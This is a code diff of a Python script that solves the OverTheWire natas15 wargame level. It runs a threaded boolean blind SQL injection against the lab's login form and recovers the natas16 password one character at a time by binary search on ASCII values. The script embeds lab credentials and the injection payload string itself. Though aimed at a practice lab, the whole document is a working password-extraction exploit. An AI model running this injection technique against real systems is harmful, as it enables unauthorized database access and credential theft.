@@ -1,26 +1,44 @@
 import requests
+from concurrent.futures import ThreadPoolExecutor, as_completed
 
-url = "http://natas15.natas.labs.overthewire.org/index.php"
-auth = ("natas15", "SdqIqBsFcz3yotlNYErZSZwblkm0lrvx")
+URL = "http://natas15.natas.labs.overthewire.org/index.php"
+AUTH = ("natas15", "GB6USCJYJjwLyYhZUNkE1NwDueiTow6g")
 
-password = ""
+session = requests.Session()
+session.auth = AUTH
 
-for i in range(1, 33):  # password length is 32
+
+def get_char(position):
     low = 32
     high = 126
 
     while low <= high:
         mid = (low + high) // 2
 
-        payload = f'natas16" AND ASCII(SUBSTRING(password,{i},1)) > {mid} -- '
-        response = requests.post(url, data={"username": payload}, auth=auth)
+        payload = f'natas16" AND ASCII(SUBSTRING(password,{position},1)) > {mid} -- '
+
+        response = session.post(
+            URL,
+            data={"username": payload},
+            timeout=10
+        )
 
         if "This user exists" in response.text:
             low = mid + 1
         else:
             high = mid - 1
 
-    password += chr(low)
-    print(f"[+] Found so far: {password}")
+    return position, chr(low)
 
-print(f"[✓] Password: {password}")
+
+password = ["?"] * 32
+
+with ThreadPoolExecutor(max_workers=16) as executor:
+    futures = [executor.submit(get_char, i) for i in range(1, 33)]
+
+    for future in as_completed(futures):
+        pos, ch = future.result()
+        password[pos - 1] = ch
+        print(f"[{pos:02}] -> {ch} | Current: {''.join(password)}")
+
+print("\nPassword:", "".join(password))
